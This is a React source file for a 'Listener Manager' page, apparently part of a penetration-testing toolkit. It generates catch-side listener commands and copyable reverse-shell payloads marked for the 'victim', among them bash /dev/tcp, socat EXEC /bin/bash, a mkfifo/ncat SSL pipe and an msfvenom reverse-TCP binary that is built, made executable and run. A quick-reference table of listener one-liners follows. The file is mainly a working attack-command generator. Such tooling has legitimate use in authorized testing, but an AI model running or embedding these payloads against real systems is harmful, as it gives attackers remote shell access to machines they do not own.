import { useState, useEffect } from 'react';
import { Radio, Plus } from 'lucide-react';
import { Card } from '../components/ui/Card.jsx';
import { Input } from '../components/ui/Input.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { useAppStore } from '../store/app.js';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const ACCENT = '#FB7185';
const CODE_BG = '#0B0F18';

const LISTENER_TYPES = [
  {
    id: 'nc',
    label: 'Netcat',
    badgeBg: 'rgba(251,113,133,0.15)',
    badgeColor: '#FDA4AF',
    listenerCmd: (host, port) => `nc -lvnp ${port}`,
    reverseCmd: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    id: 'nc-openbsd',
    label: 'Netcat (OpenBSD)',
    badgeBg: 'rgba(244,114,182,0.12)',
    badgeColor: '#F472B6',
    listenerCmd: (host, port) => `nc -lv ${port}`,
    reverseCmd: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    id: 'socat',
    label: 'Socat',
    badgeBg: 'rgba(167,139,250,0.12)',
    badgeColor: '#C4B5FD',
    listenerCmd: (host, port) => `socat TCP-LISTEN:${port},reuseaddr,fork STDOUT`,
    reverseCmd: (ip, port) =>
      `socat TCP:${ip}:${port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
  },
  {
    id: 'pwncat',
    label: 'Pwncat',
    badgeBg: 'rgba(52,211,153,0.12)',
    badgeColor: '#6EE7B7',
    listenerCmd: (host, port) => `pwncat-cs -lp ${port}`,
    reverseCmd: (ip, port) => `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
  },
  {
    id: 'msf',
    label: 'Metasploit/msfconsole',
    badgeBg: 'rgba(251,191,36,0.12)',
    badgeColor: '#FCD34D',
    listenerCmd: (host, port) =>
      `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST ${host}; set LPORT ${port}; exploit"`,
    reverseCmd: (ip, port) =>
      `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o /tmp/s && chmod +x /tmp/s && /tmp/s`,
  },
  {
    id: 'ncat-ssl',
    label: 'Ncat (with SSL)',
    badgeBg: 'rgba(56,189,248,0.12)',
    badgeColor: '#7DD3FC',
    listenerCmd: (host, port) => `ncat --ssl -lvnp ${port}`,
    reverseCmd: (ip, port) =>
      `mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat --ssl ${ip} ${port} >/tmp/f`,
  },
];

function getTypeConfig(typeId) {
  return LISTENER_TYPES.find((t) => t.id === typeId) || LISTENER_TYPES[0];
}

function CodeRow({ label, text }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
      <span
        style={{
          fontFamily: mono,
          fontSize: 9,
          fontWeight: 600,
          color: '#6B7280',
          textTransform: 'uppercase',
          letterSpacing: '0.06em',
        }}
      >
        {label}
      </span>
      <div
        style={{
          display: 'flex',
          alignItems: 'flex-start',
          gap: 8,
          background: CODE_BG,
          border: '1px solid rgba(255,255,255,0.06)',
          borderRadius: 8,
          padding: '10px 12px',
        }}
      >
        <pre
          style={{
            margin: 0,
            flex: 1,
            fontFamily: mono,
            fontSize: 11,
            color: '#E5E7EB',
            whiteSpace: 'pre-wrap',
            wordBreak: 'break-all',
            lineHeight: 1.45,
          }}
        >
          {text}
        </pre>
        <CopyButton text={text} />
      </div>
    </div>
  );
}

const QUICK_REF_ROWS = [
  { tool: 'Netcat (classic)', cmd: 'nc -lvnp 4444' },
  { tool: 'Netcat (OpenBSD)', cmd: 'nc -lv 4444' },
  { tool: 'Socat', cmd: 'socat TCP-LISTEN:4444,reuseaddr,fork STDOUT' },
  { tool: 'Pwncat', cmd: 'pwncat-cs -lp 4444' },
  { tool: 'Ncat SSL', cmd: 'ncat --ssl -lvnp 4444' },
  { tool: 'Python3 PTY', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
];

export default function Listener() {
  const storeLhost = useAppStore((s) => s.lhost);

  const [lhost, setLhost] = useState(() => storeLhost?.trim() || '0.0.0.0');
  const [lport, setLport] = useState('4444');
  const [typeId, setTypeId] = useState('nc');
  const [listeners, setListeners] = useState([]);

  useEffect(() => {
    const v = storeLhost?.trim();
    if (v) setLhost(v);
    else setLhost('0.0.0.0');
  }, [storeLhost]);

  const addListener = () => {
    const portNum = parseInt(String(lport).trim(), 10);
    if (Number.isNaN(portNum) || portNum < 1 || portNum > 65535) {
      return;
    }
    const host = lhost.trim() || '0.0.0.0';
    setListeners((prev) => [
      {
        id:
          typeof crypto !== 'undefined' && crypto.randomUUID
            ? crypto.randomUUID()
            : `lst-${Date.now()}-${Math.random().toString(36).slice(2)}`,
        type: typeId,
        host,
        port: portNum,
        createdAt: Date.now(),
      },
      ...prev,
    ]);
  };

  const removeListener = (id) => {
    setListeners((prev) => prev.filter((l) => l.id !== id));
  };

  const formatTime = (ts) =>
    new Date(ts).toLocaleString(undefined, {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

  return (
    <div
      style={{
        display: 'flex',
        flexDirection: 'column',
        gap: 20,
        maxWidth: 900,
        margin: '0 auto',
        paddingBottom: 32,
      }}
    >
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            borderRadius: 8,
            background: 'rgba(251,113,133,0.12)',
            border: '1px solid rgba(251,113,133,0.25)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
          }}
        >
          <Radio size={20} style={{ color: ACCENT }} strokeWidth={2} />
        </div>
        <h1
          style={{
            fontFamily: heading,
            fontSize: 22,
            fontWeight: 700,
            color: '#F9FAFB',
            margin: 0,
            letterSpacing: '-0.02em',
          }}
        >
          Listener Manager
        </h1>
        <ToolHelp title="Listener" description="Generate netcat, socat, and other listener commands for catching reverse shells." steps={["Set your listening port","Choose the listener type (netcat, socat, etc.)","Copy the generated command","Run it in your terminal before triggering the shell"]} tips={["Start the listener before executing the reverse shell","Use socat for encrypted connections","rlwrap gives you a better interactive shell"]} />
      </div>

      {/* Create form */}
      <Card
        style={{
          display: 'flex',
          flexDirection: 'column',
          gap: 16,
        }}
      >
        <span
          style={{
            fontFamily: mono,
            fontSize: 10,
            fontWeight: 600,
            color: '#9CA3AF',
            textTransform: 'uppercase',
            letterSpacing: '0.06em',
          }}
        >
          Create listener
        </span>
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: '1fr 1fr',
            gap: 14,
          }}
        >
          <Input
            label="LHOST"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            placeholder="0.0.0.0"
          />
          <Input
            label="LPORT"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            placeholder="4444"
          />
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <label
            style={{
              fontFamily: mono,
              fontSize: 10,
              fontWeight: 600,
              color: '#6B7280',
              textTransform: 'uppercase',
              letterSpacing: '0.05em',
            }}
          >
            Listener type
          </label>
          <select
            value={typeId}
            onChange={(e) => setTypeId(e.target.value)}
            style={{
              fontFamily: mono,
              fontSize: 12,
              color: '#E5E7EB',
              background: '#0B0F18',
              border: '1px solid rgba(255,255,255,0.08)',
              borderRadius: 8,
              padding: '10px 12px',
              cursor: 'pointer',
              outline: 'none',
            }}
          >
            {LISTENER_TYPES.map((t) => (
              <option key={t.id} value={t.id}>
                {t.label}
              </option>
            ))}
          </select>
        </div>
        <button
          type="button"
          onClick={addListener}
          style={{
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 8,
            alignSelf: 'flex-start',
            fontFamily: heading,
            fontSize: 13,
            fontWeight: 600,
            color: '#fff',
            padding: '10px 20px',
            borderRadius: 8,
            border: 'none',
            cursor: 'pointer',
            background: `linear-gradient(135deg, ${ACCENT} 0%, #BE123C 100%)`,
            boxShadow: '0 4px 14px rgba(251,113,133,0.25)',
          }}
        >
          <Plus size={18} strokeWidth={2.5} />
          Add Listener
        </button>
      </Card>

      {/* Active listeners */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
        <span
          style={{
            fontFamily: mono,
            fontSize: 10,
            fontWeight: 600,
            color: '#9CA3AF',
            textTransform: 'uppercase',
            letterSpacing: '0.06em',
          }}
        >
          Active listeners
        </span>

        {listeners.length === 0 ? (
          <Card
            style={{
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: 12,
              padding: '40px 24px',
            }}
          >
            <Radio size={36} style={{ color: '#4B5563' }} />
            <span
              style={{
                fontFamily: heading,
                fontSize: 15,
                fontWeight: 600,
                color: '#6B7280',
              }}
            >
              No listeners configured
            </span>
          </Card>
        ) : (
          listeners.map((item) => {
            const cfg = getTypeConfig(item.type);
            const listenerText = cfg.listenerCmd(item.host, item.port);
            const reverseText = cfg.reverseCmd(item.host, item.port);
            return (
              <Card
                key={item.id}
                style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: 14,
                }}
              >
                <div
                  style={{
                    display: 'flex',
                    flexWrap: 'wrap',
                    alignItems: 'center',
                    gap: 10,
                    justifyContent: 'space-between',
                  }}
                >
                  <div
                    style={{
                      display: 'flex',
                      flexWrap: 'wrap',
                      alignItems: 'center',
                      gap: 10,
                    }}
                  >
                    <span
                      style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: 6,
                        fontFamily: mono,
                        fontSize: 11,
                        color: '#9CA3AF',
                      }}
                    >
                      <span
                        style={{
                          width: 8,
                          height: 8,
                          borderRadius: '50%',
                          background: '#34D399',
                          boxShadow: '0 0 8px rgba(52,211,153,0.5)',
                        }}
                      />
                      Ready
                    </span>
                    <span
                      style={{
                        fontFamily: mono,
                        fontSize: 10,
                        fontWeight: 600,
                        padding: '4px 10px',
                        borderRadius: 6,
                        background: cfg.badgeBg,
                        color: cfg.badgeColor,
                      }}
                    >
                      {cfg.label}
                    </span>
                    <span
                      style={{
                        fontFamily: mono,
                        fontSize: 13,
                        fontWeight: 600,
                        color: '#F3F4F6',
                      }}
                    >
                      {item.host}:{item.port}
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => removeListener(item.id)}
                    style={{
                      fontFamily: mono,
                      fontSize: 11,
                      fontWeight: 600,
                      color: ACCENT,
                      background: 'rgba(251,113,133,0.08)',
                      border: '1px solid rgba(251,113,133,0.2)',
                      borderRadius: 6,
                      padding: '6px 12px',
                      cursor: 'pointer',
                    }}
                  >
                    Remove
                  </button>
                </div>

                <CodeRow label="Listener command" text={listenerText} />
                <CodeRow label="Reverse shell (victim)" text={reverseText} />

                <span
                  style={{
                    fontFamily: mono,
                    fontSize: 10,
                    color: '#6B7280',
                  }}
                >
                  Created {formatTime(item.createdAt)}
                </span>
              </Card>
            );
          })
        )}
      </div>

      {/* Quick reference */}
      <Card style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
        <span
          style={{
            fontFamily: mono,
            fontSize: 10,
            fontWeight: 600,
            color: '#9CA3AF',
            textTransform: 'uppercase',
            letterSpacing: '0.06em',
          }}
        >
          Quick reference
        </span>
        <div style={{ overflowX: 'auto' }}>
          <table
            style={{
              width: '100%',
              borderCollapse: 'collapse',
              fontFamily: mono,
              fontSize: 11,
            }}
          >
            <thead>
              <tr>
                <th
                  style={{
                    textAlign: 'left',
                    padding: '8px 10px',
                    color: '#6B7280',
                    fontWeight: 600,
                    borderBottom: '1px solid rgba(255,255,255,0.08)',
                  }}
                >
                  Tool
                </th>
                <th
                  style={{
                    textAlign: 'left',
                    padding: '8px 10px',
                    color: '#6B7280',
                    fontWeight: 600,
                    borderBottom: '1px solid rgba(255,255,255,0.08)',
                  }}
                >
                  One-liner
                </th>
              </tr>
            </thead>
            <tbody>
              {QUICK_REF_ROWS.map((row) => (
                <tr key={row.tool}>
                  <td
                    style={{
                      padding: '10px 10px',
                      color: ACCENT,
                      fontWeight: 600,
                      verticalAlign: 'top',
                      borderBottom: '1px solid rgba(255,255,255,0.04)',
                      whiteSpace: 'nowrap',
                    }}
                  >
                    {row.tool}
                  </td>
                  <td
                    style={{
                      padding: '10px 10px',
                      color: '#D1D5DB',
                      borderBottom: '1px solid rgba(255,255,255,0.04)',
                      wordBreak: 'break-all',
                    }}
                  >
                    {row.cmd}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>
    </div>
  );
}
